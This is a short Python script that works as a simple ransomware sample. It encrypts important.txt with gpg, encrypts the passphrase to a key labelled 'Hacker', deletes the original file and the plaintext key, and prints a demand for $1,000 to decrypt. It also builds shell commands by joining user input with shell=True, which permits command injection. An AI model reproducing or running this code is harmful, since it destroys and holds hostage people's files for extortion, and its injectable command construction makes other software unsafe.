import subprocess

key = input("Type a key: ")
open("key.txt", "w").write(key)

data = "important.txt" # Add path if the random.py is not in the same dir as file


subprocess.run("gpg -a --symmetric --batch --yes --passphrase " + key + " " + data, shell=True)

#subprocess.run("gpg --import attackerPubKey.asc", shell=True)
subprocess.run("gpg -a -o key.txt.asc -e -r Hacker key.txt", shell=True)


subprocess.run("rm key.txt", shell=True)
subprocess.run("rm " + data, shell=True)

print("\n***************************************\n*Your file important.txt is encrypted.*\n* To decrypt it, you need to pay me   *\n* $1,000 and send key.txt.asc to me.  *\n***************************************\n")


